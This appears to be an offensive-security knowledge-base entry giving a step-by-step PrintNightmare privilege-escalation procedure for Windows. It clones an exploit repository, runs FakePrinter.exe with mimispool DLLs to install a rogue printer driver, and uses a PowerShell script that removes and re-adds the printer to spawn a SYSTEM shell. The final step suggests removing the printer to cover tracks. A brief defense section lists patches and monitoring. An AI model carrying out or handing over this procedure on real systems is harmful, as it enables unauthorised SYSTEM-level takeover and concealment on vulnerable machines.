---
id: ea32f94c-198d-49d5-9106-fa02cb9ebe76
name: PrinterNightmare-Privilege-Escalation
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:29.875576+00:00'
updated_at: '2023-04-10T20:37:34.432703+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Abuse Elevation Control Mechanism|T1548 - Abuse Elevation
    Control Mechanism]]
  - '[[techniques/Event Triggered Execution|T1546 - Event Triggered Execution]]'
sub_techniques:
  - '[[sub-techniques/Accessibility Features|T1546.008 - Accessibility Features]]'
  - >-
    [[sub-techniques/Bypass User Account Control|T1548.002 - Bypass User Account
    Control]]
tags:
  - '[[tags/EoP - Printers]]'
  - '[[tags/PrinterNightmare]]'
  - '[[tags/Windows - Privilege Escalation]]'
commands:
  - '[[commands/clone-deploy-printer-nightmare-repository]]'
  - '[[commands/run-fakeprinter-exe-for-printer-nightmare]]'
  - '[[commands/remove-printer-instance]]'
  - '[[commands/add-printer-connection]]'
platforms:
  - Windows
tools:
  - '[[tools/deploy-printer-nightmare]]'
validated: true
---

# PrinterNightmare-Privilege-Escalation

## Summary

This procedure exploits the PrinterNightmare vulnerability in the Windows Print Spooler service to escalate privileges from a standard user to SYSTEM level. It involves cloning a repository containing exploit tools, deploying a malicious printer driver using FakePrinter.exe, and then triggering the driver load by removing and re-adding the printer, resulting in code execution with elevated privileges.

## Description

PrinterNightmare (CVE-2021-34527 and related) abuses the Print Spooler service (spoolsv.exe), which runs as SYSTEM, by installing a rogue printer driver that loads arbitrary DLLs during print job processing. The vulnerability allows unprivileged users to add drivers and printers, leading to DLL hijacking and privilege escalation. This is effective on Windows 10/11 and Server 2016+ with Print Spooler enabled. The technique bypasses UAC and can be used for persistence or further lateral movement. Prerequisites include local user access and network connectivity if targeting remote systems.

## Requirements

1. Local administrator or standard user access on a Windows target with Print Spooler service running.
2. PowerShell execution policy allowing script execution (or bypass with -ExecutionPolicy Bypass).
3. Internet access to clone the GitHub repository.
4. Target system: Windows 10/11 or Server 2019/2022 (unpatched for PrinterNightmare).

## Defense

- Disable Print Spooler service if not required: Stop-Spoolsv and set startup type to Disabled.
- Apply Microsoft patches for CVE-2021-34527 (KB5005010 or later).
- Monitor for suspicious printer driver additions via Event ID 808 in Microsoft-Windows-PrintService/Operational.
- Restrict driver installation to trusted sources using Group Policy (Computer Configuration > Administrative Templates > Printers > Point and Print Restrictions).

## Objectives

1. Escalate privileges to SYSTEM via Print Spooler abuse.
2. Execute arbitrary code with elevated permissions for persistence or data access.
3. Establish a foothold for further post-exploitation activities.

## Instructions

### Step 1: Clone the DeployPrinterNightmare Repository

**Context**: Obtain the exploit tools, including FakePrinter.exe and the malicious DLLs (32mimispool.dll and 64mimispool.dll), from the official GitHub repository. This step prepares the necessary files for driver deployment.

**Command** ([[commands/clone-deploy-printer-nightmare-repository]]):
```bash
git clone https://github.com/Flangvik/DeployPrinterNightmare
```

> This clones the repository to the current directory. Verify the clone by checking for FakePrinter.exe and the DLL files in the cloned folder.

### Step 2: Deploy Malicious Printer Driver

**Context**: Use FakePrinter.exe to copy the malicious DLLs to system directories, add the driver, create the printer named 'EasySystemShell', and set registry keys for persistence. This installs the rogue driver without requiring admin rights due to the vulnerability.

**Command** ([[commands/run-fakeprinter-exe-for-printer-nightmare]]):
```powershell
FakePrinter.exe 32mimispool.dll 64mimispool.dll EasySystemShell
```

> Run this from the cloned repository directory. The tool handles file copying to spool drivers paths, adds the 'Generic / Text Only' driver, creates the printer, and configures registry keys under HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments. If successful, no errors occur, and the printer appears in the system's printer list.

### Step 3: Trigger Privilege Escalation by Removing and Re-Adding Printer

**Context**: To force the Print Spooler to reload the malicious driver, remove the existing printer instance and re-add it. This triggers the DLL load during the print spooler restart or job processing, executing the payload with SYSTEM privileges (e.g., spawning a shell).

**Code** ([[codes/powershell-script-to-remove-and-add-printernightmare-instance]]):
```powershell
$serverName = 'printer-installed-host'
$printerName = 'EasySystemShell'
$fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})
Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
Add-Printer -ConnectionName $fullprinterName
```

> This script sets variables for the server and printer, constructs the full UNC path (appending x64 or x86 based on OS architecture), removes the printer silently if it exists, and re-adds it. Run this on the target after Step 2. Success is indicated by the printer reappearing and a SYSTEM shell spawning (if the payload is configured for shell execution).

**Command** ([[commands/remove-printer-instance]]):
```powershell
Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
```

> Removes the printer to unload the current instance.

**Command** ([[commands/add-printer-connection]]):
```powershell
Add-Printer -ConnectionName $fullprinterName
```

> Re-adds the printer, triggering the driver load and escalation.

### Step 4: Verify Escalation and Cleanup

**Context**: Confirm SYSTEM access (e.g., via whoami /priv) and optionally remove the printer to cover tracks.

Use [[commands/remove-printer-instance]] again for cleanup if needed. Expected outcome: Elevated shell or payload execution.
